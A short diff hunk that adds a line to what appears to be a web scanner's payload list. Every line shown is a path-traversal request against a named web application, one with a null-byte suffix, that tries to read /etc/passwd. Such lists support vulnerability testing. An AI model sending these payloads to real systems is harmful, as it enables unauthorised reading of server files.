@@ -308,3 +308,4 @@ gallery/index.php?include=../../../../../../../../../etc/passwd
 modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd
 phprocketaddin/?page=../../../../../../../../../../etc/passwd
 axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd
+pdf.php?module=1&pdf=../../../../../../../../../../../../../etc/passwd%00
